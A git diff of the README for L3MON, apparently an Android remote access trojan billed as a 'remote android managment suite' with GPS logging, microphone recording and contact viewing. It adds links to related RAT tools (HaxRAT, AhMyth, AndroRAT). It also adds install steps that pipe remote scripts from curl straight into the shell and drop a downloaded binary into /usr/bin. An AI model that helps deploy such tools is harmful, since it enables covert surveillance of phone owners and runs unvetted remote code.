@@ -8,10 +8,25 @@ A cloud based remote android managment suite, powered by NodeJS
 
 <p>The only way to help us is to visit our YouTube channel and subscribe to our channel, leave your comments on our videos, and follow us on GitHub. Looking forward to your cooperation.</p>
 
+## Similar tool with modification supported in termux with <a href="https://github.com/efxtv/EMSF">EMSF Tool by EFX Tv</a>
+- L3MON 
+- HaxRAT
+- LizRAT
+- Ahmyth
+- Androrat
+- ShivaTheCreator
+
+## Video Tutorial
+- [How to install ubuntu in termux](https://youtube.com/playlist?list=PLI4Vi9cCSEQkuNBwBcSPxDEEkMZ25X8n9)
+- How to install java 8 in termux
+- how to fix unable to generae maindb.json 
+- [Reset l3mon password](https://youtu.be/EA1FF44TL5o)
+- java8 in termux chroot
+- [How to install L3MON in termux With Java8 Hindi](https://youtu.be/m5RCMeDsuik)
+- [How to insall L3MON in Termux no JAVA8](https://youtu.be/kM3ZzOXLEDw) 
 
 
-
-## Features remain same 
+## Features
 - GPS Logging
 - Microphone Recording
 - View Contacts
@@ -36,12 +51,14 @@ A cloud based remote android managment suite, powered by NodeJS
 ## Installation 
 1. Install JRE 8 (We cannot stress this enough USE java 1.8.0 ANY issues that dont use this will be closed WITHOUT a response)
     - Debian, Ubuntu, Etc
-        - `sudo apt install openjdk-8-jdk openjdk-8-jre`
-        - ` source <(curl -fsSL https://raw.githubusercontent.com/efxtv/npm/main/apktool/apktool-kali-ubuntu.sh)`
-    - Termux
+     - Ubuntu chroot
+        - `sudo apt install wget curl git npm nano nodejs openjdk-8-jdk openjdk-8-jre`
+        - `source <(curl -fsSL https://raw.githubusercontent.com/efxtv/npm/main/apktool/apktool-kali-ubuntu.sh)`
+      - Termux 
         - `pkg update && pkg upgrade`
         - `source <(curl -fsSL https://raw.githubusercontent.com/efxtv/npm/main/apktool/apktool-termux.sh) `
         - `source <(curl -fsSL https://raw.githubusercontent.com/efxtv/npm/main/L3mon-no-java8.sh) `
+        - `curl -L -o $PWD/emsf https://github.com/efxtv/EMSF/blob/main/termux/emsf?raw=true -s;chmod +x emsf;mv emsf ../usr/bin/ `
     - Fedora, Oracle, Red Hat, etc
         -  `su -c "yum install java-1.8.0-openjdk"`
     - Windows 
@@ -51,6 +68,9 @@ A cloud based remote android managment suite, powered by NodeJS
 
 3. install PM2 
     - `npm install pm2 -g`
+    - `npm install`
+    - `npm audit fix`
+    - `npm audit`
 
 4. Download and Extract the latest release from [HERE](https://github.com/D3VL/L3MON/releases/)
 
